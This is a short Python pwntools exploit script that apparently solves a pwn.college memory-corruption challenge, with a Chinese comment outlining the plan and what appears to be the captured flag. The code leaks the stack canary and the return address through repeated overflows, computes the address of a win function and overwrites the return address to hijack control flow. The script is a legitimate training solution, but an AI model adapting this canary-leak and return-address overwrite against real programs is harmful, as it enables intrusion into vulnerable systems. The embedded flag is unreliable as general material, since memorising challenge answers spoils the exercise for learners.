from pwn import *

# 需要多次泄露, 泄露canary, 泄露ret, 最后再覆盖
# pwn_college{Q1IyOWI6q47224oEdULKmgIe-_S.dVjMywiMxkzW}
pro_name = './babymem_level12_teaching1'
io = process(pro_name)

ret_base_addr = 0x1f36
win_base_addr = 0x16ee

payload_0 = b'REPEAT'+b'A'*10*8+b'b'*3
payload_1 = b'REPEAT'+b'A'*12*8+b'b'*2

io.recvuntil(b'size: ')
io.sendline(b'89')
io.recvuntil(b')!\n')
io.sendline(payload_0)
io.recvuntil(payload_0)
canary = b'\x00'+io.recv(7)
#print(canary)
io.recvuntil(b'size: ')
io.sendline(b'104')
io.recvuntil(b')!\n')
io.sendline(payload_1)
io.recvuntil(payload_1)
ret_addr = io.recv(6)+b'\x00\x00'
#print(ret_addr)

win_addr = p64(u64(ret_addr)-ret_base_addr+win_base_addr)
payload_2 = b'A'*11*8+canary+b'A'*8+win_addr
io.recvuntil(b'size: ')
io.sendline(b'112')
io.recvuntil(b')!\n')
io.sendline(payload_2)
io.interactive()
